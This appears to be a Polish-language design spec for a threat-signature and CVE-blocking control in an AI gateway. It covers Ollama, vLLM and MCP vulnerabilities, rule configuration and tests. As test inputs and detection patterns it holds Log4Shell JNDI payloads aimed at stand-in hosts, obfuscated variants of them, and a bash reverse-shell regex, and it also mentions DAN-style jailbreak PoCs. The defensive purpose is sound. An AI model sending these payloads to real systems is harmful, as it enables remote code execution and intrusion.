# Threat Signature / IOC / CVE-based Blocking
> **ID:** SIG-001..007  | **Kategoria:** threat-intel | **Priorytet:** SHOULD | **Złożoność:** M | **Punkt egzekwowania:** input, tool-call, output (Rules); feed ładowany w tle

## 1. Overview
Feed znanych wskaźników zagrożeń (IOC: hashe, domeny, IP, URL, nazwy paczek; sygnatury payloadów exploitów; listy podatnych wersji narzędzi/MCP-serverów/runtime) dopasowywany deterministycznie do ruchu: promptów, argumentów narzędzi, wyników narzędzi, odpowiedzi modelu oraz **metadanych środowiska** (wersja Ollamy, wersja MCP servera, digest modelu). Dane są plikiem/tabelą z hot-reload — jury może dopisać sygnaturę na żywo i oczekiwać natychmiastowej reakcji (CLAUDE.md: polityki jako dane).

## 2. Threat / Attack
Znane, już opublikowane ataki wracają: payload exploita (Log4Shell `${jndi:ldap://...}`, path traversal `../../`, reverse shell one-linery, znane PoC prompt injection typu DAN), URL-e C2/exfiltracji, hashe złośliwych plików/modeli, wywołanie narzędzia w wersji z RCE. Atakujący nie musi być kreatywny — wystarczy kopiuj-wklej z publicznego PoC. Kontrola wyłapuje tanio „low-hanging fruit" i daje audytowalne uzasadnienie (ID CVE / ID sygnatury w logu).

## 3. Real-World Evidence
- `[CONFIRMED-VULN]` **Ollama CVE-2024-37032 (Probllama)** — path traversal w polu `digest` (/api/pull) → RCE; naprawione w 0.1.34. Typowy kandydat do wpisu „wersja <0.1.34 = BLOCK". https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032
- `[CONFIRMED-VULN]` **Ollama CVE-2024-39719/39720/39721/39722** (Oligo, 2024) — file existence, OOB read, DoS (/dev/random), path traversal w /api/push; fixy 0.1.34–0.1.47. https://oligo.security/blog/more-models-more-probllms ; https://nvd.nist.gov/vuln/detail/CVE-2024-39720
- `[CONFIRMED-VULN]` **vLLM CVE-2025-47277** (CVSS 9.8, 0.6.5–0.8.4, fix 0.8.5) — `pickle.loads` na danych sieciowych PyNcclPipe. https://www.wiz.io/vulnerability-database/cve/cve-2025-47277
- `[CONFIRMED-VULN]` **MCP:** CVE-2025-6514 (mcp-remote, OS command injection, CVSS 9.6, JFrog) i CVE-2025-49596 (MCP Inspector, RCE, fix 0.14.1). https://thehackernews.com/2025/07/critical-mcp-remote-vulnerability.html ; https://sdtimes.com/mcp/jfrog-finds-mcp-related-vulnerability-highlighting-need-for-stronger-focus-on-security-in-mcp-ecosystem/
- `[REAL-ATTACK]` **Log4Shell obfuskacja** — sygnatury „jndi" omijane przez `${${lower:j}ndi:` → pokazuje granicę signature matching (polimorfizm). https://answers.securityscientist.net/q/20884/how-did-attackers-bypass-initial-mitigations
- `[REAL-ATTACK]` **Shai-Hulud / s1ngularity** (npm, 2025) — kompromitacja setek paczek; CISA alert; konkretne listy skompromitowanych wersji rozpowszechniane jako IOC. https://flashpoint.io/blog/shai-hulud-worm-targeting-npm-supply-chains/ (szczegóły w 25-package-repo-supply-chain.md)
- `[MITIGATION]` **CISA KEV** — JSON feed `known_exploited_vulnerabilities.json` (pola: cveID, vendorProject, product, vulnerabilityName, dateAdded, requiredAction, dueDate, knownRansomwareCampaignUse, notes, cwes; envelope: catalogVersion, dateReleased, count). https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json (opis pól wg agregatorów).
- `[MITIGATION]` **OSV / OpenSSF malicious-packages** — format OSV, identyfikatory `MAL-YYYY-NNNN`, dostępne przez OSV.dev API i osv-scanner. https://openssf.org/?p=11003
- Ważne: KEV zawiera głównie klasyczne produkty; **wpisy dla narzędzi AI/MCP są nieliczne** — własną listę trzeba utrzymywać (z GitHub Security Advisories / NVD). Pokrycie KEV dla Ollama/vLLM: niezweryfikowane.

## 4. Deterministic Detection
1. **Wielowzorcowe dopasowanie stringów**: Aho-Corasick dla tysięcy literalnych fraz (nazwy narzędzi exploitów, znane payloady, URL-e) — O(n + m). Dla regexów: RE2/RE2J (liniowy, bez ReDoS) lub Hyperscan/Vectorscan (SIMD, multi-regex; wymaga natywnej biblioteki — na ARM Raspberry Pi użyć **Vectorscan**, fork Hyperscan z ARM/NEON; niezweryfikowane w tej sesji).
2. **Indeksy hashy** (SHA-256 modeli/plików/załączników) — `HashSet`/Bloom filter; domeny/IP — trie/CIDR tree.
3. **Wersje**: porównanie semver/zakresów z OSV (`affected.ranges`) dla `tool.name@version` zgłaszanych przez MCP `initialize` (serverInfo.version) lub z inwentarza; deklaratywnie: `vulnerable: "<0.1.34"`.
4. **Widoki**: dopasowanie na wszystkich widokach z CANON (kanoniczny, zdekodowany, hidden).
5. **Wersjonowanie feedu**: `feed_version`, `sha256`, `signed_by`; atomowa podmiana (`AtomicReference<CompiledRuleSet>`), kompilacja nowego zestawu w tle, rollback przy błędzie; podpis (np. minisign/cosign) weryfikowany offline.
6. **Aktualizacje offline**: paczka `.tar.gz` z feedem (KEV JSON + OSV zip dump + własne YAML) importowana z dysku/USB; brak zależności od sieci w runtime.

## 5. Detection Pipeline
Feed loader (watch katalogu/DB + endpoint admin `POST /admin/feeds/reload`) → kompilacja (Aho-Corasick/RE2/Hyperscan) → `SignatureRegistry`. W torze żądania: Request → Canonicalization (widoki) → AuthN → Policy → **Rules: SIG-*** → LLM/MCP → Output (SIG na odpowiedzi/outputach narzędzi: np. znany shellcode, IOC URL exfiltracji) → Response. Dodatkowo „admission" przy rejestracji MCP servera/modelu (SIG-004/005).

## 6. Possible Actions
BLOCK dla payloadów exploitów i wersji z KEV/CRITICAL; QUARANTINE dla modelu/narzędzia o nieznanej wersji lub trafieniu w hash; REVIEW dla wersji podatnych HIGH bez znanego exploita; REDACT dla IOC w outputcie (np. URL C2); RATE_LIMIT przy powtarzanych próbach (skan exploitów); ALLOW + log INFO dla trafień niskiej pewności.

## 7. Bypass / Limitations
- Polimorfizm/obfuskacja (Log4Shell `${${lower:j}ndi`) — sygnatury literalne przegrywają; częściowa mitygacja przez CANON i reguły strukturalne (parser wyrażeń `${...}` zamiast stringa). `[REAL-ATTACK]`
- Zero-day i nowe PoC — feed zawsze opóźniony; żadnej ochrony przed nieznanym.
- Wersja podatna nie zawsze wykrywalna (serwer nie ujawnia wersji; MCP `serverInfo` jest deklaracją serwera, nie dowodem).
- FP: sygnatury na krótkie frazy, legalne dyskusje o exploitach (zespół bezpieczeństwa pyta o Log4Shell) — rozróżnienie wymaga kontekstu (sidecar) lub polityki per rola.
- Wydajność: Aho-Corasick liniowy; Hyperscan szybki ale kompilacja zestawów trwa sekundy — kompilować w tle. Zużycie pamięci przy 100k+ wzorców.
- Jakość feedu: ryzyko zatrucia feedu (supply chain na samym feedzie) — podpisy, allowlista źródeł.

## 8. Deterministic vs AI
Deterministycznie: wszystko, co ma stabilny identyfikator (hash, CVE, wersja, domena, dokładna fraza). Sidecar: wykrycie *wariantu* znanej techniki (parafraza PoC jailbreaku), ocena czy wzmianka o exploicie to atak czy edukacja, klasyfikacja nowych payloadów (podobieństwo embeddingów do znanych sygnatur). Sygnatura = jeden sygnał w hybrid scoringu.

## 9. Implementation Options
- Java: `org.ahocorasick:ahocorasick` (robert-bor, Apache-2.0) lub double-array trie; `com.google.re2j` dla regexów (linear-time); JNI do Vectorscan tylko jeśli potrzeba. YAML reguł + `WatchService`/Postgres LISTEN/NOTIFY dla hot-reload. Parser OSV JSON (Jackson), semver (`com.github.zafarkhaja:java-semver`, niezweryfikowane).
- Python sidecar: `yara-python` (jeśli chcemy YARA na plikach/modelach), `sigma-cli`/pySigma do konwersji Sigma — raczej narzędzia offline przy budowie feedu, nie w hot path.

## 10. Existing Open Source
| Nazwa | Link | Język | Licencja | Zastosowanie | Zalety | Wady | Trudność | Offline? | Przydatność |
|---|---|---|---|---|---|---|---|---|---|
| aho-corasick (robert-bor) | https://github.com/robert-bor/aho-corasick | Java | Apache-2.0 | Multi-literal match | Prosty, szybki | Bez regex, mało aktywny | niska | tak | wysoka |
| RE2J | https://github.com/google/re2j | Java | BSD-3 | Regex bez ReDoS | Bezpieczny | Wolniejszy niż natywny RE2 | niska | tak | wysoka |
| Hyperscan / Vectorscan | https://github.com/intel/hyperscan , https://github.com/VectorCamp/vectorscan | C++ | BSD-3 | Multi-regex SIMD | Bardzo szybki | Natywny, JNI; status repo Intel niezweryfikowany | wysoka | tak | niska/średnia |
| YARA | https://github.com/VirusTotal/yara | C | BSD-3 | Reguły na plikach/modelach | Standard branżowy | Nie dla strumienia JSON | średnia | tak | średnia (24-MODEL-SC) |
| Sigma | https://github.com/SigmaHQ/sigma | YAML | DRL 1.1 | Format reguł logów | Format czytelny | Dla SIEM, nie gateway | średnia | tak | niska (inspiracja formatu) |
| STIX/TAXII (OASIS) | https://oasis-open.github.io/cti-documentation/ | JSON | — | Wymiana IOC | Standard | Ciężki | średnia | import offline | niska |
| OSV + osv-scanner | https://osv.dev , https://github.com/google/osv-scanner | Go/JSON | Apache-2.0 | Podatności, MAL- | Offline dump, ekosystemy | Mało wpisów AI | niska | tak (dump) | wysoka |
| CISA KEV | https://www.cisa.gov/known-exploited-vulnerabilities-catalog | JSON | public domain | Exploited CVE | Prosty feed | Mało AI | trywialna | tak (snapshot) | średnia |
| OpenSSF malicious-packages | https://github.com/ossf/malicious-packages | OSV JSON | Apache-2.0 (niezweryfikowane) | Złośliwe paczki | Format OSV | Opóźnienie | niska | tak | wysoka (PKG) |

## 11. Proposed Control
- SIG-001 Exploit payload signatures (Aho-Corasick + RE2J, widoki CANON) — BLOCK
- SIG-002 Known-bad IOC (domeny/IP/URL/hash) w input/tool args/output — BLOCK/REDACT
- SIG-003 Vulnerable tool/runtime version registry (OSV/KEV/własne GHSA) — BLOCK/QUARANTINE
- SIG-004 Model/artifact hash denylist (link do MODEL-SC)
- SIG-005 Known-malicious package names (link do PKG)
- SIG-006 Feed lifecycle: podpis, wersja, hot-reload, rollback, tryb dry-run (shadow)
- SIG-007 Known prompt-attack PoC corpus (link do PI)

## 12. Example Configuration
```yaml
- id: SIG-001
  name: Known exploit payload markers (JNDI/traversal/reverse shell)
  category: threat-intel
  enabled: true
  priority: 40
  scope: { direction: [input, tool-call, output], agents: ["*"], tools: ["*"], environments: ["*"] }
  conditions: { views: [canonical, decoded, hidden_ascii] }
  matcher:
    type: multi-pattern
    engine: re2j
    patterns:
      - { id: jndi, pattern: '\$\{\s*(?:[a-z:\-\$\{\}]*?)j(?:[a-z:\-\$\{\}]*?)n(?:[a-z:\-\$\{\}]*?)d(?:[a-z:\-\$\{\}]*?)i\s*:' }
      - { id: bash-revshell, pattern: 'bash\s+-i\s+>&\s*/dev/tcp/' }
  action: BLOCK
  severity: HIGH
  threshold: null
  exceptions: [ { role: security-analyst, action: REVIEW } ]
  metadata: { owasp: [LLM01, LLM05], cve: [CVE-2021-44228], references: [] }
- id: SIG-003
  name: Vulnerable Ollama version
  category: threat-intel
  enabled: true
  priority: 20
  scope: { direction: [session], agents: ["*"], tools: [], environments: ["*"] }
  conditions: {}
  matcher: { type: version-range, product: ollama, source: osv, vulnerable: "<0.1.47", advisories: [CVE-2024-37032, CVE-2024-39720, CVE-2024-39722] }
  action: QUARANTINE
  severity: CRITICAL
  threshold: null
  exceptions: []
  metadata: { owasp: [LLM03], references: ["https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032"] }
```

## 13. Example Requests
```json
{"req":{"messages":[{"role":"user","content":"test ${${lower:j}ndi:ldap://x.example/a}"}]},"expect":{"decision":"BLOCK","rule":"SIG-001"}}
{"req":{"mcp":{"serverInfo":{"name":"mcp-remote","version":"0.1.15"}}},"expect":{"decision":"BLOCK","rule":"SIG-003","note":"CVE-2025-6514 (fixed in 0.1.16 — wersję fixu zweryfikować w advisory)"}}
{"req":{"messages":[{"role":"user","content":"Explain how Log4Shell works"}]},"expect":{"decision":"ALLOW"}}
```

## 14. Testing
| ID | Input | Oczekiwany wynik |
|---|---|---|
| SIG-T001 | `${jndi:ldap://evil/a}` | BLOCK |
| SIG-T002 | `${${::-j}${::-n}${::-d}${::-i}:ldap://...}` | BLOCK (regex strukturalny) |
| SIG-T003 | base64 payloadu jndi | BLOCK przez widok decoded |
| SIG-T004 | „What is CVE-2021-44228?" | ALLOW |
| SIG-T005 | Ollama 0.1.30 w inwentarzu | QUARANTINE |
| SIG-T006 | Ollama 0.9.0 | ALLOW |
| SIG-T007 | Hot-reload: dodaj sygnaturę → ponów request | BLOCK bez restartu |
| SIG-T008 | Uszkodzony feed (zły podpis) | odrzucony, stary zestaw aktywny, alert |
| SIG-T009 | Payload rozbity na 2 wiadomości | brak detekcji (znane ograniczenie; sesyjna korelacja/sidecar) |
| SIG-T010 | 100k wzorców, 10 KB input | < 5 ms |

## 15. Sources
- Wiz Probllama — https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032 — [CONFIRMED-VULN]
- Oligo More Models More ProbLLMs — https://oligo.security/blog/more-models-more-probllms — [CONFIRMED-VULN]
- NVD CVE-2024-39720 — https://nvd.nist.gov/vuln/detail/CVE-2024-39720 — [CONFIRMED-VULN]
- Wiz CVE-2025-47277 — https://www.wiz.io/vulnerability-database/cve/cve-2025-47277 — [CONFIRMED-VULN]
- THN mcp-remote — https://thehackernews.com/2025/07/critical-mcp-remote-vulnerability.html — [CONFIRMED-VULN]
- SD Times JFrog MCP — https://sdtimes.com/mcp/jfrog-finds-mcp-related-vulnerability-highlighting-need-for-stronger-focus-on-security-in-mcp-ecosystem/ — [CONFIRMED-VULN]
- CISA KEV feed — https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json — [MITIGATION]
- OpenSSF OSV malicious packages — https://openssf.org/?p=11003 — [MITIGATION]
- Flashpoint Shai-Hulud — https://flashpoint.io/blog/shai-hulud-worm-targeting-npm-supply-chains/ — [REAL-ATTACK]
- Log4Shell obfuscation — https://answers.securityscientist.net/q/20884/how-did-attackers-bypass-initial-mitigations — [REAL-ATTACK]
- aho-corasick Java — https://github.com/robert-bor/aho-corasick — Apache-2.0
